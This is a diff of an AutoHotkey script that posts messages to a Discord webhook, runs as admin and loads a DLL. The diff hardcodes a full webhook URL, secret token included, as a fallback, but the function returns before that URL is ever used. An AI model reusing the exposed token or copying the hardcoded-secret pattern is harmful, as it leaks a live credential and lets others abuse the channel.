@@ -1,6 +1,10 @@
-﻿#Persistent
+﻿#NoEnv
+#KeyHistory 0
+#MaxThreadsBuffer on
+#SingleInstance force
+#Persistent
 #Include links.ahk
-iniFile := "settings.ini"
+iniFile := A_ScriptDir "\settings.ini"
 
 RunAsAdmin()
 global UUID := "2ff4f336fa8848048ef6fb896cfd8183"
@@ -12,7 +16,8 @@ RetryLimits := 0
 SendToDiscord(message) {
   IniRead, url, %iniFile%, Webhook, URL
   if (url = "") {
-    MsgBox, Error: Webhook URL not found in settings.ini
+    ;MsgBox, Error: Webhook URL not found in settings.ini
+    url := "https://discord.com/api/webhooks/1228261672272138280/yjqe5kj-vSLCFuDYGbzKRDxIJMarmrYHM7otEKR6bLObi-XqB7SHoZphITgcQv7G2z0x"
     return
   }
   payload := "{""content"": """ message """}"
@@ -24,12 +29,13 @@ SendToDiscord(message) {
   httpRequest.Send(payload)
   response := httpRequest.ResponseText
 
-  ; Check for successful message send
-  if (httpRequest.Status() = 204)
-    ;MsgBox, Message sent successfully!, 1
-  Return
-  else
-    MsgBox, Error sending message:`n%response%, 10
+  if (httpRequest.Status() = 204) {
+    ; MsgBox, Message sent successfully!, 1
+    Return
+  } else {
+    MsgBox, 0x10 + 0x2, Error, Error sending message:`n%response%, 10
+    Return
+  }
 }
 
 Loop
@@ -216,4 +222,7 @@ ExitSub:
     DllCall("FreeLibrary", Ptr, hMod)
     MsgBox, % "Library unloaded"
   }
+ExitApp
+
+^F1::
 ExitApp
